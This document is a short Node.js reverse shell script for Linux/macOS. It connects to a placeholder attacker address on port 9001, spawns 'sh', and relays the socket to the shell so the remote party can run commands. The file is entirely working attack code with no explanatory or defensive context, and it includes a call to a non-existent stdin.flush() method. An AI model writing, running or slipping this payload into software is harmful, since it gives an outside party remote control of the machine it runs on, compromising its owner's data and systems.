// Linux/macOS
const net = require('net');
const { spawn } = require('child_process');

function s2p(s, p) {
    s.on('data', (data) => {
        if (data.length > 0) {
            p.stdin.write(data);
            p.stdin.flush();
        }
    });
}

function p2s(s, p) {
    p.stdout.on('data', (data) => {
        s.write(data);
    });
}

const s = net.createConnection({ host: 'IP_ADDRESS', port: 9001 }, () => {});

const p = spawn('sh', { stdio: ['pipe', 'pipe', 'pipe'] });

s2p(s, p);
p2s(s, p);

p.on('exit', (code) => {
    s.end();
});

process.on('SIGINT', () => {
    s.end();
});